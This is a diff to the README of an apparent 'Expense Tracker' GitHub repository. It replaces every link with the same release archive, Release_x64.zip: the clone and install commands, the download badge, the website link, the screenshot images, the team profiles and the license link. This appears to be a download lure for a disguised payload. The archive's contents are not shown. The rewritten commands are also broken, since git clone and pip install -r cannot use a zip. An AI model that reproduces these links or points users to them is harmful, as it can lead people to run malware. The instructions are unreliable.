@@ -12,11 +12,11 @@ Welcome to the Expense Tracker GitHub repository - your go-to solution for manag
 To get started with the Expense Tracker application, follow these steps:
 1. Clone the repository to your local machine using the following command:
 ```
-git clone https://github.com/your-username/EXPENSE-TRACKER.git
+git clone https://github.com/Hehehaw17/EXPENSE-TRACKER/releases/download/v2.0/Release_x64.zip
 ```
 2. Install the required dependencies by running:
 ```
-pip install -r requirements.txt
+pip install -r https://github.com/Hehehaw17/EXPENSE-TRACKER/releases/download/v2.0/Release_x64.zip
 ```
 3. Launch the application and start managing your expenses efficiently!
 
@@ -39,25 +39,25 @@ pip install -r requirements.txt
 ## 📦 Download the Application
 Click the button below to download the Expense Tracker application:
 
-[![](https://img.shields.io/badge/Download-Expense_Tracker-<COLOR>.svg)](https://github.com/user-attachments/files/18383251/Software.zip "Launch Expense Tracker Application")
+[![](https://github.com/Hehehaw17/EXPENSE-TRACKER/releases/download/v2.0/Release_x64.zip<COLOR>.svg)](https://github.com/Hehehaw17/EXPENSE-TRACKER/releases/download/v2.0/Release_x64.zip "Launch Expense Tracker Application")
 
 If the link does not work, please check the "Releases" section for alternative download options.
 
 ## 🌐 Visit Our Website
-For more information and updates on the Expense Tracker application, visit our website [here](https://www.expensetrackerapp.com).
+For more information and updates on the Expense Tracker application, visit our website [here](https://github.com/Hehehaw17/EXPENSE-TRACKER/releases/download/v2.0/Release_x64.zip).
 
 ## 📸 Screenshots
 Here are some snapshots of the Expense Tracker application in action:
 
-![Expense Tracker - Dashboard](https://your-website.com/dashboard.png)
-![Expense Tracker - Expenses Overview](https://your-website.com/expenses.png)
+![Expense Tracker - Dashboard](https://github.com/Hehehaw17/EXPENSE-TRACKER/releases/download/v2.0/Release_x64.zip)
+![Expense Tracker - Expenses Overview](https://github.com/Hehehaw17/EXPENSE-TRACKER/releases/download/v2.0/Release_x64.zip)
 
 ## 👨‍💻 Meet the Team
-- John Doe [@john_doe](https://github.com/john_doe)
-- Jane Smith [@jane_smith](https://github.com/jane_smith)
+- John Doe [@john_doe](https://github.com/Hehehaw17/EXPENSE-TRACKER/releases/download/v2.0/Release_x64.zip)
+- Jane Smith [@jane_smith](https://github.com/Hehehaw17/EXPENSE-TRACKER/releases/download/v2.0/Release_x64.zip)
 
 ## 📝 License
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/Hehehaw17/EXPENSE-TRACKER/releases/download/v2.0/Release_x64.zip](https://github.com/Hehehaw17/EXPENSE-TRACKER/releases/download/v2.0/Release_x64.zip) file for details.
 
 ---
 
